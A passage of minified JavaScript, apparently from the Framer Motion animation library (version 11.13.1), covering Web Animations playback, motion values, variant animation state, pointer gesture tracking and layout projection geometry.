    return typeof e == "function" && wl() ? k1(e, t) : hh(e) ? Lo(e) : Array.isArray(e) ? e.map(n => V1(n, t) || Rd.easeOut) : Rd[e]
}
function f4(e, t, n, { delay: r = 0, duration: s = 300, repeat: o = 0, repeatType: i = "loop", ease: l = "easeInOut", times: c } = {}) {
  const u = {
    [t]: n
  };
  c && (u.offset = c);
  const d = V1(l, s);
  return Array.isArray(d) && (u.easing = d),
    e.animate(u, {
      delay: r,
      duration: s,
      easing: Array.isArray(d) ? "linear" : d,
      fill: "both",
      iterations: o + 1,
      direction: i === "reverse" ? "alternate" : "normal"
    })
}
function Qp(e, t) {
  e.timeline = t,
    e.onfinish = null
}
const h4 = gh(() => Object.hasOwnProperty.call(Element.prototype, "animate"))
  , bl = 10
  , m4 = 2e4;
function p4(e) {
  return fh(e.type) || e.type === "spring" || !F1(e.ease)
}
function g4(e, t) {
  const n = new ph({
    ...t,
    keyframes: e,
    repeat: 0,
    delay: 0,
    isGenerator: !0
  });
  let r = {
    done: !1,
    value: e[0]
  };
  const s = [];
  let o = 0;
  for (; !r.done && o < m4;)
    r = n.sample(o),
      s.push(r.value),
      o += bl;
  return {
    times: void 0,
    keyframes: s,
    duration: o - bl,
    ease: "linear"
  }
}
const B1 = {
  anticipate: u1,
  backInOut: c1,
  circInOut: f1
};
function y4(e) {
  return e in B1
}
class qp extends T1 {
  constructor(t) {
    super(t);
    const { name: n, motionValue: r, element: s, keyframes: o } = this.options;
    this.resolver = new E1(o, (i, l) => this.onKeyframesResolved(i, l), n, r, s),
      this.resolver.scheduleResolve()
  }
  initPlayback(t, n) {
    var r;
    let { duration: s = 300, times: o, ease: i, type: l, motionValue: c, name: u, startTime: d } = this.options;
    if (!(!((r = c.owner) === null || r === void 0) && r.current))
      return !1;
    if (typeof i == "string" && wl() && y4(i) && (i = B1[i]),
      p4(this.options)) {
      const { onComplete: h, onUpdate: y, motionValue: b, element: v, ...C } = this.options
        , g = g4(t, C);
      t = g.keyframes,
        t.length === 1 && (t[1] = t[0]),
        s = g.duration,
        o = g.times,
        i = g.ease,
        l = "keyframes"
    }
    const f = f4(c.owner.current, u, t, {
      ...this.options,
      duration: s,
      times: o,
      ease: i
    });
    return f.startTime = d ?? this.calcStartTime(),
      this.pendingTimeline ? (Qp(f, this.pendingTimeline),
        this.pendingTimeline = void 0) : f.onfinish = () => {
          const { onComplete: h } = this.options;
          c.set(sc(t, this.options, n)),
            h && h(),
            this.cancel(),
            this.resolveFinishedPromise()
        }
      ,
    {
      animation: f,
      duration: s,
      times: o,
      type: l,
      ease: i,
      keyframes: t
    }
  }
  get duration() {
    const { resolved: t } = this;
    if (!t)
      return 0;
    const { duration: n } = t;
    return On(n)
  }
  get time() {
    const { resolved: t } = this;
    if (!t)
      return 0;
    const { animation: n } = t;
    return On(n.currentTime || 0)
  }
  set time(t) {
    const { resolved: n } = this;
    if (!n)
      return;
    const { animation: r } = n;
    r.currentTime = Rn(t)
  }
  get speed() {
    const { resolved: t } = this;
    if (!t)
      return 1;
    const { animation: n } = t;
    return n.playbackRate
  }
  set speed(t) {
    const { resolved: n } = this;
    if (!n)
      return;
    const { animation: r } = n;
    r.playbackRate = t
  }
  get state() {
    const { resolved: t } = this;
    if (!t)
      return "idle";
    const { animation: n } = t;
    return n.playState
  }
  get startTime() {
    const { resolved: t } = this;
    if (!t)
      return null;
    const { animation: n } = t;
    return n.startTime
  }
  attachTimeline(t) {
    if (!this._resolved)
      this.pendingTimeline = t;
    else {
      const { resolved: n } = this;
      if (!n)
        return Je;
      const { animation: r } = n;
      Qp(r, t)
    }
    return Je
  }
  play() {
    if (this.isStopped)
      return;
    const { resolved: t } = this;
    if (!t)
      return;
    const { animation: n } = t;
    n.playState === "finished" && this.updateFinishedPromise(),
      n.play()
  }
  pause() {
    const { resolved: t } = this;
    if (!t)
      return;
    const { animation: n } = t;
    n.pause()
  }
  stop() {
    if (this.resolver.cancel(),
      this.isStopped = !0,
      this.state === "idle")
      return;
    this.resolveFinishedPromise(),
      this.updateFinishedPromise();
    const { resolved: t } = this;
    if (!t)
      return;
    const { animation: n, keyframes: r, duration: s, type: o, ease: i, times: l } = t;
    if (n.playState === "idle" || n.playState === "finished")
      return;
    if (this.time) {
      const { motionValue: u, onUpdate: d, onComplete: f, element: h, ...y } = this.options
        , b = new ph({
          ...y,
          keyframes: r,
          duration: s,
          type: o,
          ease: i,
          times: l,
          isGenerator: !0
        })
        , v = Rn(this.time);
      u.setWithVelocity(b.sample(v - bl).value, b.sample(v).value, bl)
    }
    const { onStop: c } = this.options;
    c && c(),
      this.cancel()
  }
  complete() {
    const { resolved: t } = this;
    t && t.animation.finish()
  }
  cancel() {
    const { resolved: t } = this;
    t && t.animation.cancel()
  }
  static supports(t) {
    const { motionValue: n, name: r, repeatDelay: s, repeatType: o, damping: i, type: l } = t;
    return h4() && r && c4.has(r) && n && n.owner && n.owner.current instanceof HTMLElement && !n.owner.getProps().onUpdate && !s && o !== "mirror" && i !== 0 && l !== "inertia"
  }
}
const v4 = gh(() => window.ScrollTimeline !== void 0);
class x4 {
  constructor(t) {
    this.stop = () => this.runAll("stop"),
      this.animations = t.filter(Boolean)
  }
  then(t, n) {
    return Promise.all(this.animations).then(t).catch(n)
  }
  getAll(t) {
    return this.animations[0][t]
  }
  setAll(t, n) {
    for (let r = 0; r < this.animations.length; r++)
      this.animations[r][t] = n
  }
  attachTimeline(t, n) {
    const r = this.animations.map(s => v4() && s.attachTimeline ? s.attachTimeline(t) : n(s));
    return () => {
      r.forEach((s, o) => {
        s && s(),
          this.animations[o].stop()
      }
      )
    }
  }
  get time() {
    return this.getAll("time")
  }
  set time(t) {
    this.setAll("time", t)
  }
  get speed() {
    return this.getAll("speed")
  }
  set speed(t) {
    this.setAll("speed", t)
  }
  get startTime() {
    return this.getAll("startTime")
  }
  get duration() {
    let t = 0;
    for (let n = 0; n < this.animations.length; n++)
      t = Math.max(t, this.animations[n].duration);
    return t
  }
  runAll(t) {
    this.animations.forEach(n => n[t]())
  }
  flatten() {
    this.runAll("flatten")
  }
  play() {
    this.runAll("play")
  }
  pause() {
    this.runAll("pause")
  }
  cancel() {
    this.runAll("cancel")
  }
  complete() {
    this.runAll("complete")
  }
}
function w4({ when: e, delay: t, delayChildren: n, staggerChildren: r, staggerDirection: s, repeat: o, repeatType: i, repeatDelay: l, from: c, elapsed: u, ...d }) {
  return !!Object.keys(d).length
}
const yh = (e, t, n, r = {}, s, o) => i => {
  const l = rh(r, e) || {}
    , c = l.delay || r.delay || 0;
  let { elapsed: u = 0 } = r;
  u = u - Rn(c);
  let d = {
    keyframes: Array.isArray(n) ? n : [null, n],
    ease: "easeOut",
    velocity: t.getVelocity(),
    ...l,
    delay: -u,
    onUpdate: h => {
      t.set(h),
        l.onUpdate && l.onUpdate(h)
    }
    ,
    onComplete: () => {
      i(),
        l.onComplete && l.onComplete()
    }
    ,
    name: e,
    motionValue: t,
    element: o ? void 0 : s
  };
  w4(l) || (d = {
    ...d,
    ...W3(e, d)
  }),
    d.duration && (d.duration = Rn(d.duration)),
    d.repeatDelay && (d.repeatDelay = Rn(d.repeatDelay)),
    d.from !== void 0 && (d.keyframes[0] = d.from);
  let f = !1;
  if ((d.type === !1 || d.duration === 0 && !d.repeatDelay) && (d.duration = 0,
    d.delay === 0 && (f = !0)),
    f && !o && t.get() !== void 0) {
    const h = sc(d.keyframes, l);
    if (h !== void 0)
      return de.update(() => {
        d.onUpdate(h),
          d.onComplete()
      }
      ),
        new x4([])
  }
  return !o && qp.supports(d) ? new qp(d) : new ph(d)
}
  , b4 = e => !!(e && typeof e == "object" && e.mix && e.toValue)
  , S4 = e => Nd(e) ? e[e.length - 1] || 0 : e;
function vh(e, t) {
  e.indexOf(t) === -1 && e.push(t)
}
function xh(e, t) {
  const n = e.indexOf(t);
  n > -1 && e.splice(n, 1)
}
class wh {
  constructor() {
    this.subscriptions = []
  }
  add(t) {
    return vh(this.subscriptions, t),
      () => xh(this.subscriptions, t)
  }
  notify(t, n, r) {
    const s = this.subscriptions.length;
    if (s)
      if (s === 1)
        this.subscriptions[0](t, n, r);
      else
        for (let o = 0; o < s; o++) {
          const i = this.subscriptions[o];
          i && i(t, n, r)
        }
  }
  getSize() {
    return this.subscriptions.length
  }
  clear() {
    this.subscriptions.length = 0
  }
}
const Gp = 30
  , C4 = e => !isNaN(parseFloat(e));
class N4 {
  constructor(t, n = {}) {
    this.version = "11.13.1",
      this.canTrackVelocity = null,
      this.events = {},
      this.updateAndNotify = (r, s = !0) => {
        const o = gn.now();
        this.updatedAt !== o && this.setPrevFrameValue(),
          this.prev = this.current,
          this.setCurrent(r),
          this.current !== this.prev && this.events.change && this.events.change.notify(this.current),
          s && this.events.renderRequest && this.events.renderRequest.notify(this.current)
      }
      ,
      this.hasAnimated = !1,
      this.setCurrent(t),
      this.owner = n.owner
  }
  setCurrent(t) {
    this.current = t,
      this.updatedAt = gn.now(),
      this.canTrackVelocity === null && t !== void 0 && (this.canTrackVelocity = C4(this.current))
  }
  setPrevFrameValue(t = this.current) {
    this.prevFrameValue = t,
      this.prevUpdatedAt = this.updatedAt
  }
  onChange(t) {
    return this.on("change", t)
  }
  on(t, n) {
    this.events[t] || (this.events[t] = new wh);
    const r = this.events[t].add(n);
    return t === "change" ? () => {
      r(),
        de.read(() => {
          this.events.change.getSize() || this.stop()
        }
        )
    }
      : r
  }
  clearListeners() {
    for (const t in this.events)
      this.events[t].clear()
  }
  attach(t, n) {
    this.passiveEffect = t,
      this.stopPassiveEffect = n
  }
  set(t, n = !0) {
    !n || !this.passiveEffect ? this.updateAndNotify(t, n) : this.passiveEffect(t, this.updateAndNotify)
  }
  setWithVelocity(t, n, r) {
    this.set(n),
      this.prev = void 0,
      this.prevFrameValue = t,
      this.prevUpdatedAt = this.updatedAt - r
  }
  jump(t, n = !0) {
    this.updateAndNotify(t),
      this.prev = t,
      this.prevUpdatedAt = this.prevFrameValue = void 0,
      n && this.stop(),
      this.stopPassiveEffect && this.stopPassiveEffect()
  }
  get() {
    return this.current
  }
  getPrevious() {
    return this.prev
  }
  getVelocity() {
    const t = gn.now();
    if (!this.canTrackVelocity || this.prevFrameValue === void 0 || t - this.updatedAt > Gp)
      return 0;
    const n = Math.min(this.updatedAt - this.prevUpdatedAt, Gp);
    return D1(parseFloat(this.current) - parseFloat(this.prevFrameValue), n)
  }
  start(t) {
    return this.stop(),
      new Promise(n => {
        this.hasAnimated = !0,
          this.animation = t(n),
          this.events.animationStart && this.events.animationStart.notify()
      }
      ).then(() => {
        this.events.animationComplete && this.events.animationComplete.notify(),
          this.clearAnimation()
      }
      )
  }
  stop() {
    this.animation && (this.animation.stop(),
      this.events.animationCancel && this.events.animationCancel.notify()),
      this.clearAnimation()
  }
  isAnimating() {
    return !!this.animation
  }
  clearAnimation() {
    delete this.animation
  }
  destroy() {
    this.clearListeners(),
      this.stop(),
      this.stopPassiveEffect && this.stopPassiveEffect()
  }
}
function Pi(e, t) {
  return new N4(e, t)
}
function j4(e, t, n) {
  e.hasValue(t) ? e.getValue(t).set(n) : e.addValue(t, Pi(n))
}
function P4(e, t) {
  const n = rc(e, t);
  let { transitionEnd: r = {}, transition: s = {}, ...o } = n || {};
  o = {
    ...o,
    ...r
  };
  for (const i in o) {
    const l = S4(o[i]);
    j4(e, i, l)
  }
}
const bh = e => e.replace(/([a-z])([A-Z])/gu, "$1-$2").toLowerCase()
  , A4 = "framerAppearId"
  , z1 = "data-" + bh(A4);
function U1(e) {
  return e.props[z1]
}
const Xe = e => !!(e && e.getVelocity);
function E4(e) {
  return !!(Xe(e) && e.add)
}
function Od(e, t) {
  const n = e.getValue("willChange");
  if (E4(n))
    return n.add(t)
}
function T4({ protectedKeys: e, needsAnimating: t }, n) {
  const r = e.hasOwnProperty(n) && t[n] !== !0;
  return t[n] = !1,
    r
}
function $1(e, t, { delay: n = 0, transitionOverride: r, type: s } = {}) {
  var o;
  let { transition: i = e.getDefaultTransition(), transitionEnd: l, ...c } = t;
  r && (i = r);
  const u = []
    , d = s && e.animationState && e.animationState.getState()[s];
  for (const f in c) {
    const h = e.getValue(f, (o = e.latestValues[f]) !== null && o !== void 0 ? o : null)
      , y = c[f];
    if (y === void 0 || d && T4(d, f))
      continue;
    const b = {
      delay: n,
      ...rh(i || {}, f)
    };
    let v = !1;
    if (window.MotionHandoffAnimation) {
      const g = U1(e);
      if (g) {
        const m = window.MotionHandoffAnimation(g, f, de);
        m !== null && (b.startTime = m,
          v = !0)
      }
    }
    Od(e, f),
      h.start(yh(f, h, y, e.shouldReduceMotion && rs.has(f) ? {
        type: !1
      } : b, e, v));
    const C = h.animation;
    C && u.push(C)
  }
  return l && Promise.all(u).then(() => {
    de.update(() => {
      l && P4(e, l)
    }
    )
  }
  ),
    u
}
function Id(e, t, n = {}) {
  var r;
  const s = rc(e, t, n.type === "exit" ? (r = e.presenceContext) === null || r === void 0 ? void 0 : r.custom : void 0);
  let { transition: o = e.getDefaultTransition() || {} } = s || {};
  n.transitionOverride && (o = n.transitionOverride);
  const i = s ? () => Promise.all($1(e, s, n)) : () => Promise.resolve()
    , l = e.variantChildren && e.variantChildren.size ? (u = 0) => {
      const { delayChildren: d = 0, staggerChildren: f, staggerDirection: h } = o;
      return k4(e, t, d + u, f, h, n)
    }
      : () => Promise.resolve()
    , { when: c } = o;
  if (c) {
    const [u, d] = c === "beforeChildren" ? [i, l] : [l, i];
    return u().then(() => d())
  } else
    return Promise.all([i(), l(n.delay)])
}
function k4(e, t, n = 0, r = 0, s = 1, o) {
  const i = []
    , l = (e.variantChildren.size - 1) * r
    , c = s === 1 ? (u = 0) => u * r : (u = 0) => l - u * r;
  return Array.from(e.variantChildren).sort(D4).forEach((u, d) => {
    u.notify("AnimationStart", t),
      i.push(Id(u, t, {
        ...o,
        delay: n + c(d)
      }).then(() => u.notify("AnimationComplete", t)))
  }
  ),
    Promise.all(i)
}
function D4(e, t) {
  return e.sortNodePosition(t)
}
function M4(e, t, n = {}) {
  e.notify("AnimationStart", t);
  let r;
  if (Array.isArray(t)) {
    const s = t.map(o => Id(e, o, n));
    r = Promise.all(s)
  } else if (typeof t == "string")
    r = Id(e, t, n);
  else {
    const s = typeof t == "function" ? rc(e, t, n.custom) : t;
    r = Promise.all($1(e, s, n))
  }
  return r.then(() => {
    e.notify("AnimationComplete", t)
  }
  )
}
const R4 = nh.length;
function H1(e) {
  if (!e)
    return;
  if (!e.isControllingVariants) {
    const n = e.parent ? H1(e.parent) || {} : {};
    return e.props.initial !== void 0 && (n.initial = e.props.initial),
      n
  }
  const t = {};
  for (let n = 0; n < R4; n++) {
    const r = nh[n]
      , s = e.props[r];
    (Ci(s) || s === !1) && (t[r] = s)
  }
  return t
}
const O4 = [...th].reverse()
  , I4 = th.length;
function _4(e) {
  return t => Promise.all(t.map(({ animation: n, options: r }) => M4(e, n, r)))
}
function L4(e) {
  let t = _4(e)
    , n = Kp()
    , r = !0;
  const s = c => (u, d) => {
    var f;
    const h = rc(e, d, c === "exit" ? (f = e.presenceContext) === null || f === void 0 ? void 0 : f.custom : void 0);
    if (h) {
      const { transition: y, transitionEnd: b, ...v } = h;
      u = {
        ...u,
        ...v,
        ...b
      }
    }
    return u
  }
    ;
  function o(c) {
    t = c(e)
  }
  function i(c) {
    const { props: u } = e
      , d = H1(e.parent) || {}
      , f = []
      , h = new Set;
    let y = {}
      , b = 1 / 0;
    for (let C = 0; C < I4; C++) {
      const g = O4[C]
        , m = n[g]
        , p = u[g] !== void 0 ? u[g] : d[g]
        , w = Ci(p)
        , S = g === c ? m.isActive : null;
      S === !1 && (b = C);
      let N = p === d[g] && p !== u[g] && w;
      if (N && r && e.manuallyAnimateOnMount && (N = !1),
        m.protectedKeys = {
          ...y
        },
        !m.isActive && S === null || !p && !m.prevProp || nc(p) || typeof p == "boolean")
        continue;
      const P = F4(m.prevProp, p);
      let A = P || g === c && m.isActive && !N && w || C > b && w
        , k = !1;
      const D = Array.isArray(p) ? p : [p];
      let q = D.reduce(s(g), {});
      S === !1 && (q = {});
      const { prevResolvedValues: I = {} } = m
        , H = {
          ...I,
          ...q
        }
        , z = X => {
          A = !0,
            h.has(X) && (k = !0,
              h.delete(X)),
            m.needsAnimating[X] = !0;
          const O = e.getValue(X);
          O && (O.liveStyle = !1)
        }
        ;
      for (const X in H) {
        const O = q[X]
          , R = I[X];
        if (y.hasOwnProperty(X))
          continue;
        let L = !1;
        Nd(O) && Nd(R) ? L = !r1(O, R) : L = O !== R,
          L ? O != null ? z(X) : h.add(X) : O !== void 0 && h.has(X) ? z(X) : m.protectedKeys[X] = !0
      }
      m.prevProp = p,
        m.prevResolvedValues = q,
        m.isActive && (y = {
          ...y,
          ...q
        }),
        r && e.blockInitialAnimation && (A = !1),
        A && (!(N && P) || k) && f.push(...D.map(X => ({
          animation: X,
          options: {
            type: g
          }
        })))
    }
    if (h.size) {
      const C = {};
      h.forEach(g => {
        const m = e.getBaseTarget(g)
          , p = e.getValue(g);
        p && (p.liveStyle = !0),
          C[g] = m ?? null
      }
      ),
        f.push({
          animation: C
        })
    }
    let v = !!f.length;
    return r && (u.initial === !1 || u.initial === u.animate) && !e.manuallyAnimateOnMount && (v = !1),
      r = !1,
      v ? t(f) : Promise.resolve()
  }
  function l(c, u) {
    var d;
    if (n[c].isActive === u)
      return Promise.resolve();
    (d = e.variantChildren) === null || d === void 0 || d.forEach(h => {
      var y;
      return (y = h.animationState) === null || y === void 0 ? void 0 : y.setActive(c, u)
    }
    ),
      n[c].isActive = u;
    const f = i(c);
    for (const h in n)
      n[h].protectedKeys = {};
    return f
  }
  return {
    animateChanges: i,
    setActive: l,
    setAnimateFunction: o,
    getState: () => n,
    reset: () => {
      n = Kp(),
        r = !0
    }
  }
}
function F4(e, t) {
  return typeof t == "string" ? t !== e : Array.isArray(t) ? !r1(t, e) : !1
}
function kr(e = !1) {
  return {
    isActive: e,
    protectedKeys: {},
    needsAnimating: {},
    prevResolvedValues: {}
  }
}
function Kp() {
  return {
    animate: kr(!0),
    whileInView: kr(),
    whileHover: kr(),
    whileTap: kr(),
    whileDrag: kr(),
    whileFocus: kr(),
    exit: kr()
  }
}
class Tr {
  constructor(t) {
    this.isMounted = !1,
      this.node = t
  }
  update() { }
}
class V4 extends Tr {
  constructor(t) {
    super(t),
      t.animationState || (t.animationState = L4(t))
  }
  updateAnimationControlsSubscription() {
    const { animate: t } = this.node.getProps();
    nc(t) && (this.unmountControls = t.subscribe(this.node))
  }
  mount() {
    this.updateAnimationControlsSubscription()
  }
  update() {
    const { animate: t } = this.node.getProps()
      , { animate: n } = this.node.prevProps || {};
    t !== n && this.updateAnimationControlsSubscription()
  }
  unmount() {
    var t;
    this.node.animationState.reset(),
      (t = this.unmountControls) === null || t === void 0 || t.call(this)
  }
}
let B4 = 0;
class z4 extends Tr {
  constructor() {
    super(...arguments),
      this.id = B4++
  }
  update() {
    if (!this.node.presenceContext)
      return;
    const { isPresent: t, onExitComplete: n } = this.node.presenceContext
      , { isPresent: r } = this.node.prevPresenceContext || {};
    if (!this.node.animationState || t === r)
      return;
    const s = this.node.animationState.setActive("exit", !t);
    n && !t && s.then(() => n(this.id))
  }
  mount() {
    const { register: t } = this.node.presenceContext || {};
    t && (this.unmount = t(this.id))
  }
  unmount() { }
}
const U4 = {
  animation: {
    Feature: V4
  },
  exit: {
    Feature: z4
  }
};
function $4(e, t, n) {
  var r;
  if (e instanceof Element)
    return [e];
  if (typeof e == "string") {
    let s = document;
    const o = (r = void 0) !== null && r !== void 0 ? r : s.querySelectorAll(e);
    return o ? Array.from(o) : []
  }
  return Array.from(e)
}
const Wt = {
  x: !1,
  y: !1
};
function W1() {
  return Wt.x || Wt.y
}
function Yp(e) {
  return t => {
    t.pointerType === "touch" || W1() || e(t)
  }
}
function H4(e, t, n = {}) {
  const r = new AbortController
    , s = {
      passive: !0,
      ...n,
      signal: r.signal
    }
    , o = Yp(i => {
      const { target: l } = i
        , c = t(i);
      if (!c || !l)
        return;
      const u = Yp(d => {
        c(d),
          l.removeEventListener("pointerleave", u)
      }
      );
      l.addEventListener("pointerleave", u, s)
    }
    );
  return $4(e).forEach(i => {
    i.addEventListener("pointerenter", o, s)
  }
  ),
    () => r.abort()
}
function W4(e) {
  return e === "x" || e === "y" ? Wt[e] ? null : (Wt[e] = !0,
    () => {
      Wt[e] = !1
    }
  ) : Wt.x || Wt.y ? null : (Wt.x = Wt.y = !0,
    () => {
      Wt.x = Wt.y = !1
    }
  )
}
const Q1 = e => e.pointerType === "mouse" ? typeof e.button != "number" || e.button <= 0 : e.isPrimary !== !1;
function zi(e) {
  return {
    point: {
      x: e.pageX,
      y: e.pageY
    }
  }
}
const Q4 = e => t => Q1(t) && e(t, zi(t));
function kn(e, t, n, r = {
  passive: !0
}) {
  return e.addEventListener(t, n, r),
    () => e.removeEventListener(t, n)
}
function wr(e, t, n, r) {
  return kn(e, t, Q4(n), r)
}
const Xp = (e, t) => Math.abs(e - t);
function q4(e, t) {
  const n = Xp(e.x, t.x)
    , r = Xp(e.y, t.y);
  return Math.sqrt(n ** 2 + r ** 2)
}
class q1 {
  constructor(t, n, { transformPagePoint: r, contextWindow: s, dragSnapToOrigin: o = !1 } = {}) {
    if (this.startEvent = null,
      this.lastMoveEvent = null,
      this.lastMoveEventInfo = null,
      this.handlers = {},
      this.contextWindow = window,
      this.updatePoint = () => {
        if (!(this.lastMoveEvent && this.lastMoveEventInfo))
          return;
        const f = fu(this.lastMoveEventInfo, this.history)
          , h = this.startEvent !== null
          , y = q4(f.offset, {
            x: 0,
            y: 0
          }) >= 3;
        if (!h && !y)
          return;
        const { point: b } = f
          , { timestamp: v } = Be;
        this.history.push({
          ...b,
          timestamp: v
        });
        const { onStart: C, onMove: g } = this.handlers;
        h || (C && C(this.lastMoveEvent, f),
          this.startEvent = this.lastMoveEvent),
          g && g(this.lastMoveEvent, f)
      }
      ,
      this.handlePointerMove = (f, h) => {
        this.lastMoveEvent = f,
          this.lastMoveEventInfo = du(h, this.transformPagePoint),
          de.update(this.updatePoint, !0)
      }
      ,
      this.handlePointerUp = (f, h) => {
        this.end();
        const { onEnd: y, onSessionEnd: b, resumeAnimation: v } = this.handlers;
        if (this.dragSnapToOrigin && v && v(),
          !(this.lastMoveEvent && this.lastMoveEventInfo))
          return;
        const C = fu(f.type === "pointercancel" ? this.lastMoveEventInfo : du(h, this.transformPagePoint), this.history);
        this.startEvent && y && y(f, C),
          b && b(f, C)
      }
      ,
      !Q1(t))
      return;
    this.dragSnapToOrigin = o,
      this.handlers = n,
      this.transformPagePoint = r,
      this.contextWindow = s || window;
    const i = zi(t)
      , l = du(i, this.transformPagePoint)
      , { point: c } = l
      , { timestamp: u } = Be;
    this.history = [{
      ...c,
      timestamp: u
    }];
    const { onSessionStart: d } = n;
    d && d(t, fu(l, this.history)),
      this.removeListeners = xr(wr(this.contextWindow, "pointermove", this.handlePointerMove), wr(this.contextWindow, "pointerup", this.handlePointerUp), wr(this.contextWindow, "pointercancel", this.handlePointerUp))
  }
  updateHandlers(t) {
    this.handlers = t
  }
  end() {
    this.removeListeners && this.removeListeners(),
      Cr(this.updatePoint)
  }
}
function du(e, t) {
  return t ? {
    point: t(e.point)
  } : e
}
function Jp(e, t) {
  return {
    x: e.x - t.x,
    y: e.y - t.y
  }
}
function fu({ point: e }, t) {
  return {
    point: e,
    delta: Jp(e, G1(t)),
    offset: Jp(e, G4(t)),
    velocity: K4(t, .1)
  }
}
function G4(e) {
  return e[0]
}
function G1(e) {
  return e[e.length - 1]
}
function K4(e, t) {
  if (e.length < 2)
    return {
      x: 0,
      y: 0
    };
  let n = e.length - 1
    , r = null;
  const s = G1(e);
  for (; n >= 0 && (r = e[n],
    !(s.timestamp - r.timestamp > Rn(t)));)
    n--;
  if (!r)
    return {
      x: 0,
      y: 0
    };
  const o = On(s.timestamp - r.timestamp);
  if (o === 0)
    return {
      x: 0,
      y: 0
    };
  const i = {
    x: (s.x - r.x) / o,
    y: (s.y - r.y) / o
  };
  return i.x === 1 / 0 && (i.x = 0),
    i.y === 1 / 0 && (i.y = 0),
    i
}
function Ns(e) {
  return e && typeof e == "object" && Object.prototype.hasOwnProperty.call(e, "current")
}
const K1 = 1e-4
  , Y4 = 1 - K1
  , X4 = 1 + K1
  , Y1 = .01
  , J4 = 0 - Y1
  , Z4 = 0 + Y1;
function jt(e) {
  return e.max - e.min
}
function eA(e, t, n) {
  return Math.abs(e - t) <= n
}
function Zp(e, t, n, r = .5) {
  e.origin = r,
    e.originPoint = we(t.min, t.max, e.origin),
    e.scale = jt(n) / jt(t),
    e.translate = we(n.min, n.max, e.origin) - e.originPoint,
    (e.scale >= Y4 && e.scale <= X4 || isNaN(e.scale)) && (e.scale = 1),
    (e.translate >= J4 && e.translate <= Z4 || isNaN(e.translate)) && (e.translate = 0)
}
function Jo(e, t, n, r) {
  Zp(e.x, t.x, n.x, r ? r.originX : void 0),
    Zp(e.y, t.y, n.y, r ? r.originY : void 0)
}
function eg(e, t, n) {
  e.min = n.min + t.min,
    e.max = e.min + jt(t)
}
function tA(e, t, n) {
  eg(e.x, t.x, n.x),
    eg(e.y, t.y, n.y)
}
function tg(e, t, n) {
  e.min = t.min - n.min,
    e.max = e.min + jt(t)
}
function Zo(e, t, n) {
  tg(e.x, t.x, n.x),
    tg(e.y, t.y, n.y)
}
function nA(e, { min: t, max: n }, r) {
  return t !== void 0 && e < t ? e = r ? we(t, e, r.min) : Math.max(e, t) : n !== void 0 && e > n && (e = r ? we(n, e, r.max) : Math.min(e, n)),
    e
}
function ng(e, t, n) {
  return {
    min: t !== void 0 ? e.min + t : void 0,
    max: n !== void 0 ? e.max + n - (e.max - e.min) : void 0
  }
}
function rA(e, { top: t, left: n, bottom: r, right: s }) {
  return {
    x: ng(e.x, n, s),
    y: ng(e.y, t, r)
  }
}
function rg(e, t) {
  let n = t.min - e.min
    , r = t.max - e.max;
  return t.max - t.min < e.max - e.min && ([n, r] = [r, n]),
  {
    min: n,
    max: r
  }
}
function sA(e, t) {
  return {
    x: rg(e.x, t.x),
    y: rg(e.y, t.y)
  }
}
function oA(e, t) {
  let n = .5;
  const r = jt(e)
    , s = jt(t);
  return s > r ? n = so(t.min, t.max - r, e.min) : r > s && (n = so(e.min, e.max - s, t.min)),
    Bn(0, 1, n)
}
function iA(e, t) {
  const n = {};
  return t.min !== void 0 && (n.min = t.min - e.min),
    t.max !== void 0 && (n.max = t.max - e.min),
    n
}
const _d = .35;
function aA(e = _d) {
  return e === !1 ? e = 0 : e === !0 && (e = _d),
  {
    x: sg(e, "left", "right"),
    y: sg(e, "top", "bottom")
  }
}
function sg(e, t, n) {
  return {
    min: og(e, t),
    max: og(e, n)
  }
}
function og(e, t) {
  return typeof e == "number" ? e : e[t] || 0
}
const ig = () => ({
  translate: 0,
  scale: 1,
  origin: 0,
  originPoint: 0
})
  , js = () => ({
    x: ig(),
    y: ig()
  })
  , ag = () => ({
    min: 0,
    max: 0
  })
  , Ae = () => ({
    x: ag(),
    y: ag()
  });
function Mt(e) {
  return [e("x"), e("y")]
}
function X1({ top: e, left: t, right: n, bottom: r }) {
  return {
    x: {
      min: t,
      max: n
    },
    y: {
      min: e,
      max: r
    }
  }
}
function lA({ x: e, y: t }) {
  return {
    top: t.min,
    right: e.max,
    bottom: t.max,
    left: e.min
  }
}
function cA(e, t) {
  if (!t)
    return e;
  const n = t({
    x: e.left,
    y: e.top
  })
    , r = t({
      x: e.right,
      y: e.bottom
    });
  return {
    top: n.y,
    left: n.x,
    bottom: r.y,
    right: r.x
  }
}
function hu(e) {
  return e === void 0 || e === 1
}
function Ld({ scale: e, scaleX: t, scaleY: n }) {
  return !hu(e) || !hu(t) || !hu(n)
}
function Rr(e) {
  return Ld(e) || J1(e) || e.z || e.rotate || e.rotateX || e.rotateY || e.skewX || e.skewY
}
function J1(e) {
  return lg(e.x) || lg(e.y)
}
function lg(e) {
  return e && e !== "0%"
}
function Sl(e, t, n) {
  const r = e - n
    , s = t * r;
  return n + s
}
function cg(e, t, n, r, s) {
  return s !== void 0 && (e = Sl(e, s, r)),
    Sl(e, n, r) + t
}
function Fd(e, t = 0, n = 1, r, s) {
  e.min = cg(e.min, t, n, r, s),
    e.max = cg(e.max, t, n, r, s)
}
function Z1(e, { x: t, y: n }) {
  Fd(e.x, t.translate, t.scale, t.originPoint),
    Fd(e.y, n.translate, n.scale, n.originPoint)
}
const ug = .999999999999
  , dg = 1.0000000000001;
function uA(e, t, n, r = !1) {
  const s = n.length;
  if (!s)
    return;
  t.x = t.y = 1;
  let o, i;
  for (let l = 0; l < s; l++) {
    o = n[l],
      i = o.projectionDelta;
    const { visualElement: c } = o.options;
    c && c.props.style && c.props.style.display === "contents" || (r && o.options.layoutScroll && o.scroll && o !== o.root && As(e, {
      x: -o.scroll.offset.x,
      y: -o.scroll.offset.y
    }),
      i && (t.x *= i.x.scale,
        t.y *= i.y.scale,
        Z1(e, i)),
      r && Rr(o.latestValues) && As(e, o.latestValues))
  }
  t.x < dg && t.x > ug && (t.x = 1),
    t.y < dg && t.y > ug && (t.y = 1)
}
function Ps(e, t) {
  e.min = e.min + t,
    e.max = e.max + t
}
function fg(e, t, n, r, s = .5) {
  const o = we(e.min, e.max, s);
  Fd(e, t, n, o, r)
}
function As(e, t) {
  fg(e.x, t.x, t.scaleX, t.scale, t.originX),
    fg(e.y, t.y, t.scaleY, t.scale, t.originY)
}
function ew(e, t) {
  return X1(cA(e.getBoundingClientRect(), t))
}
function dA(e, t, n) {
  const r = ew(e, n)
    , { scroll: s } = t;
  return s && (Ps(r.x, s.offset.x),
    Ps(r.y, s.offset.y)),
    r
}
